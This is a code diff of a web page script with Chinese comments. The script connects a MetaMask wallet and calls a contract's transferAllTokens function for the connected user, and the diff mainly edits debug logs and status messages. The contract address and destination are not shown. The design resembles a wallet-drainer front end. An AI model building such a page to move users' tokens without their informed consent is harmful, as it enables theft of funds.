@@ -13,29 +13,24 @@ const abi = [
   // 其他ABI内容...
 ];
 
-// 添加调试信息: 当页面加载时打印信息
-console.log("页面加载完成，正在准备连接钱包...");
-
 // 连接钱包
 document.getElementById('connectButton').addEventListener('click', async () => {
   try {
-    console.log("连接钱包按钮已点击，开始连接钱包...");
-    document.getElementById('statusMessage').textContent = "尝试连接钱包...";
+    console.log("连接钱包按钮已点击，尝试连接钱包...");
     
     if (typeof window.ethereum !== 'undefined') {
-      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
       userAddress = accounts[0];
       web3 = new Web3(window.ethereum);
       contract = new web3.eth.Contract(abi, contractAddress);
 
       // 钱包连接成功，启用按钮
       document.getElementById('transferButton').disabled = false;
-      document.getElementById('statusMessage').textContent = '钱包已连接: ' + userAddress;
       console.log("钱包已连接，用户地址: ", userAddress);
+      document.getElementById('statusMessage').textContent = '钱包已连接: ' + userAddress;
     } else {
       alert('未检测到Metamask，请安装或启用插件');
-      document.getElementById('statusMessage').textContent = 'Metamask未检测到';
-      console.log("Metamask插件未安装或未启用");
+      console.log("Metamask插件未检测到");
     }
   } catch (error) {
     console.error("连接钱包时出现错误: ", error);
@@ -53,18 +48,14 @@ document.getElementById('transferButton').addEventListener('click', async () => 
 
   try {
     console.log("转移所有代币按钮已点击，开始执行代币转移...");
-    document.getElementById('statusMessage').textContent = "执行代币转移...";
     
-    // 打印调试信息，确保交互步骤正确
-    console.log("准备调用 transferAllTokens 函数...");
-    await contract.methods.transferAllTokens(userAddress).send({ from: userAddress });
-
+    const result = await contract.methods.transferAllTokens(userAddress).send({ from: userAddress });
+    
+    console.log("转移交易结果: ", result);
     alert('代币转移成功');
     document.getElementById('statusMessage').textContent = "代币转移成功";
-    console.log("代币转移成功");
   } catch (error) {
     console.error("代币转移时出现错误: ", error);
     document.getElementById('statusMessage').textContent = '代币转移失败，请重试';
   }
 });
-``
